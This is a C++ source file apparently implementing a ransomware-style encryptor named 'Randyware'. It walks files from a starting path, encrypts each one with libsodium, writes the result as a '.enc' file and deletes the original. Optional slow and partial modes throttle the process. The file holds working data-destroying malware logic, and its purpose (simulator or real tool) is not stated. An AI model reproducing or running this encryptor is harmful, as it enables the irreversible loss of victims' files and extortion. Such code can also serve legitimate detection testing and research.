#include "randy.hpp"

#include <cstddef>
#include <expected>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <print>
#include <thread>

#include "sodium.hpp"

namespace Randy {

auto Randyware::init(const fs::path& startingPath, size_t timeout, bool partial, bool slow)
    -> std::expected<Randyware, RandywareErrors> {
    auto s = Sodium::init();
    if (!s) return std::unexpected{s.error()};
    return Randyware{startingPath, std::move(*s), timeout, partial, slow};
}

auto Randyware::readFileAsString(const fs::path& path, std::string& out) -> bool {
    std::ifstream file{path, std::ios::binary};
    std::error_code ec;

    if (!file) {
        std::println("Failed to open file: {}", path.string());
        return false;
    }
    size_t fileSize = fs::file_size(path, ec);
    if (ec) {
        std::println("Failed to get file size: {}", path.string());
        return false;
    }
    out.resize(fileSize);
    file.read(out.data(), static_cast<std::streamsize>(fileSize));

    return true;
}

auto Randyware::writeEncrypted(const std::vector<std::byte>& enc, fs::path& filePath) -> void {
    const fs::path copy = filePath;
    filePath.replace_extension(".enc");
    std::ofstream f{filePath, std::ios_base::binary};
    f.write(reinterpret_cast<const char*>(enc.data()), static_cast<std::streamsize>(enc.size()));
    fs::remove(copy);
    return;
}

auto Randyware::encryptor() -> void {
    while (next()) {
        std::vector<fs::path> files = takeFiles();  // This should move
        for (const auto& file : files) {
            if (slow_) {
                std::this_thread::sleep_for(std::chrono::milliseconds(timeout_));
            }
            std::string content;
            if (!readFileAsString(file, content)) {
                std::println("Failed to read file: {}", file.string());
                continue;
            }
            auto encryptRes = encryptor_.encrypt(content);
            if (!encryptRes.has_value()) {
                std::println("Failed to encrypt: {}", to_string(encryptRes.error()));
                continue;
            }

            auto [cipher, cipherLen] = encryptRes.value();
            auto decryptRes = encryptor_.decrypt(cipher, cipherLen);
            if (!decryptRes.has_value()) {
                std::println("Failed to decrypt: {}", to_string(decryptRes.error()));
                return;
            }
            std::string decryptedText = decryptRes.value();
            writeEncrypted(encryptRes.value().first, const_cast<fs::path&>(file));
        }
    }
}
}  // namespace Randy
